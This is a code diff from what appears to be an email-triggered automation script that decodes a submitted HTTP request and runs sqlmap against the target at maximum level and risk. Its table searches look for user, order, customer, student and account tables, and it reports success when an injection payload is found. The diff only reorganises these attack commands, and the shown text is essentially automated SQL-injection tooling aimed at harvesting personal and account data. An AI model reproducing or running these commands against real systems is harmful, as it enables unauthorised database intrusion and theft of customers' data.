@@ -57,12 +57,12 @@ def doCommand(sender, body: str):
                 b64FileContent, TmpFileName), subject="自动处理 sql注入")
             shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
             ret = shell(
-                "sqlmap -r %s --batch --level=5 --risk=3 --threads=10 --count --ignore-code=404&&sqlmap -r %s --batch "
-                "--level=5 --risk=3 --threads=10 --count --ignore-code=404 --force-ssl&&sqlmap -r %s --batch "
-                "--level=5 --risk=3 --threads=10 --dbs --ignore-code=404 --search -T user,order,customer,kehu,"
-                "student,account --stop=10&&sqlmap -r %s --batch "
+                "sqlmap -r %s --batch --level=5 --risk=3 --threads=10 --dbs --ignore-code=404 --search -T user,order,"
+                "customer,kehu,student,account --stop=10&&sqlmap -r %s --batch "
                 "--level=5 --risk=3 --search -T user,order,customer,kehu,student,account --stop=10"
-                "--threads=10 --dbs --force-ssl --ignore-code=404 " % (TmpFileName, TmpFileName,TmpFileName,TmpFileName))
+                "--threads=10 --dbs --force-ssl --ignore-code=404" % (TmpFileName, TmpFileName))
+            ret2 = shell(f'sqlmap -r {TmpFileName} --batch --count --ignore-code=404 --threads=10')
+            ret3 = shell(f'sqlmap -r {TmpFileName} --batch --count --force-ssl --ignore-code=404 --threads=10')
             status = '失败'
             if "Payload:" in ret:
                 status = '成功'
